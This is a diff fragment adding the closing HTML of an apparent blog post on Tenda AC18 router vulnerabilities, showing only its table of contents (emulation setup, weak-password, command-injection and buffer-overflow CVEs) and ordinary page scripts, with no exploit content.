+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Set-up"><span class="toc-number">1.</span> <span class="toc-text">Environment Set up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieve-Firmware"><span class="toc-number">1.1.</span> <span class="toc-text">Retrieve Firmware</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-User-Mode-Emulation"><span class="toc-number">1.2.</span> <span class="toc-text">qemu User-Mode Emulation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu-System-Mode-Emulation"><span class="toc-number">1.3.</span> <span class="toc-text">qemu System-Mode Emulation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-Executable-File"><span class="toc-number">1.4.</span> <span class="toc-text">Patch Executable File</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Password"><span class="toc-number">2.</span> <span class="toc-text">Weak Password</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-5768-amp-CVE-2018-5770"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2018-5768 &amp; CVE-2018-5770</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-16334"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2018-16334</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-15916"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2020-15916</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-28557"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2022-28557</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Overflow"><span class="toc-number">4.</span> <span class="toc-text">Buffer Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2018-5767"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2018-5767</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-28556"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2022-28556</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&text=Tenda AC18 AC1900 Router"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&is_video=false&description=Tenda AC18 AC1900 Router"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tenda AC18 AC1900 Router&body=Check out this article: https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&title=Tenda AC18 AC1900 Router"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&name=Tenda AC18 AC1900 Router&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://thomasonzhao.github.io/2022/08/05/Tenda-AC18-AC1900-Router/&t=Tenda AC18 AC1900 Router"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    Thomason Zhao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ThomasonZhao">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+</body>
+</html>
